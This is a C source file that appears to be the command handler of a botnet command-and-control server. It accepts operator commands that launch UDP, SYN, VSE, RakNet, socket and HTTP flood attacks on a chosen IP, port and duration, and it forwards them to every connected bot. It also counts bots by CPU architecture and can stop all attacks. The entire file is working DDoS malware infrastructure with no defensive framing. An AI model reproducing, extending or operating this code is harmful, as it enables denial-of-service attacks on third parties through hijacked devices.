#include "command_handler.h"
#include "botnet.h"
#include "checks.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

void handle_help_command(char *response);
void handle_bots_command(char *response);
void handle_clear_command(char *response);
void handle_attack_command(const User *user, const char *command, char *response);
void handle_stopall_command(char *response);
void handle_opthelp_command(char *response);

int is_attack_command(const char *command) {
    return strncmp(command, "!udp", 4) == 0 ||
           strncmp(command, "!syn", 4) == 0 ||
           strncmp(command, "!vse", 4) == 0 ||
           strncmp(command, "!socket", 7) == 0 ||
           strncmp(command, "!http", 5) == 0 ||
           strncmp(command, "!raknet", 7) == 0;
}

void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {    char response[MAX_COMMAND_LENGTH];
    if (strlen(command) == 0)
        return;

    log_command(user->user, user_ip, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response, sizeof(response), RED "\rGlobal cooldown still active for " YELLOW "%d seconds\n" RESET, global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response, strlen(response), 0);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strcmp(command, "!help") == 0) {
        handle_help_command(response);
    } else if (strcmp(command, "!bots") == 0) {
        handle_bots_command(response);
    } else if (strcmp(command, "!clear") == 0) {
        handle_clear_command(response);
    } else if (strcmp(command, "!opthelp") == 0) {
        handle_opthelp_command(response);
    } else if (strcmp(command, "!exit") == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, YELLOW "\rGoodbye!\n" RESET);
        send(client_socket, response, strlen(response), 0);
        close(client_socket);
        return;
    } else if (is_attack_command(command)) {
        handle_attack_command(user, command, response);
    } else if (strcmp(command, "!stopall") == 0) {
        handle_stopall_command(response);
    } else {
        snprintf(response, sizeof(response), RED "\rCommand not found\n" RESET);
    }

    send(client_socket, response, strlen(response), 0);
}

void handle_help_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             "\r\n" YELLOW "!stopall - stops all atks\n"
             "\r!opthelp - see attack options\n"
             "\r!help - see this\n"
             "\r!bots - list bots\n"
             "\r!clear - clear screen\n"
             "\r!exit - leave CNC\n"
             BLUE "\r!vse - VSE Queries, udp generic [+ Options]\n"
             "\r!raknet - RakNet UnConnected+Magic ping flood [+ Options]\n"
             "\r!udp - raw/plain flood udp [+ Options]\n"
             "\r!syn - plain SYN Flood [+ Options]\n"
             "\r!socket - open connection spam [OPTIONLESS]\n"
             "\r!http - HTTP 1.1 GET flood (tcp) [OPTIONLESS]\n"
             RESET
             );
}

void handle_opthelp_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             "\r\n" YELLOW "Optional Arguments:\n"
             "\rsrcport=<port> - Source port for the attack (SYN,UDP)\n"
             "\rpsize=<size> - Packet size (max: 1492 VSE, 64500 SYN,UDP)\n"
             RESET);
}

void handle_bots_command(char *response) {
    int valid_bots = 0;
    int arch_count[12] = {0};
    const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown"};
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            valid_bots++;
            for (int j = 0; j < 12; j++) {
                if (strcmp(bots[i].arch, arch_names[j]) == 0) {
                    arch_count[j]++;
                    break;
                }
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, "total: %d\r\n", valid_bots);
    for (int i = 0; i < 12; i++) {
        if (arch_count[i] > 0) {
            snprintf(response + strlen(response), MAX_COMMAND_LENGTH - strlen(response), "%s: %d\r\n", arch_names[i], arch_count[i]);
        }
    }
}

void handle_clear_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH, "\033[H\033[J");
}

void handle_attack_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH] = {0};
    int port = 0, time = 0, srcport = 0, psize = 0;
    int has_srcport = 0, has_psize = 0;
    char *args[8] = {0};
    int arg_count = 0;

    if (sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr) < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "\rUsage: !method <ipv4> <dport> <time> [options]\n" RESET);
        return;
    }

    if (!validate_ip(ip) || !validate_port(port) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "\rInvalid IP, port, or time\n" RESET);
        return;
    }

    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && arg_count < 8) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "srcport=", 8) == 0) {
            if (has_srcport) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "\rsrcport argument detected is duplicate!\n" RESET);
                return;
            }
            if (!(strcmp(cmd, "!udp") == 0 || strcmp(cmd, "!syn") == 0 || strcmp(cmd, "!raknet") == 0)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "\rsrcport not supported for this method\n" RESET);
                return;
            }
            const char *val = args[i] + 8;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "\rInvalid srcport (not an integer)\n" RESET);
                return;
            }
            srcport = atoi(val);
            if (!validate_srcport(srcport)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "\rInvalid srcport\n" RESET);
                return;
            }
            has_srcport = 1;
        } else if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "\rduplicate argument detected\n" RESET);
                return;
            }
            if (!(strcmp(cmd, "!udp") == 0 || strcmp(cmd, "!syn") == 0 || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!raknet") == 0)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "\rpsize not supported for this method\n" RESET);
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "\rInvalid psize (not an integer)\n" RESET);
                return;
            }
            psize = atoi(val);
            if (!validate_psize(psize, cmd)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "\rInvalid psize\n" RESET);
                return;
            }
            has_psize = 1;
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, RED "\rUnknown option: %s\n" RESET, args[i]);
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int valid_bots = 0;
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            char bot_command[MAX_COMMAND_LENGTH];
            if (has_srcport && has_psize)
                snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d psize=%d", cmd, ip, port, time, srcport, psize);
            else if (has_srcport)
                snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d", cmd, ip, port, time, srcport);
            else if (has_psize)
                snprintf(bot_command, sizeof(bot_command), "%s %s %d %d psize=%d", cmd, ip, port, time, psize);
            else
                snprintf(bot_command, sizeof(bot_command), "%s %s %d %d", cmd, ip, port, time);
            send(bots[i].socket, bot_command, strlen(bot_command), 0);
            valid_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, "\rSent instructions to %d bots\n", valid_bots);
}

void handle_stopall_command(char *response) {
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        send(bots[i].socket, "stop", strlen("stop"), 0);
    }
    pthread_mutex_unlock(&bot_mutex);
    snprintf(response, MAX_COMMAND_LENGTH, "\rAttempting to stop attacks...\n");
    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = 0;
    pthread_mutex_unlock(&cooldown_mutex);
}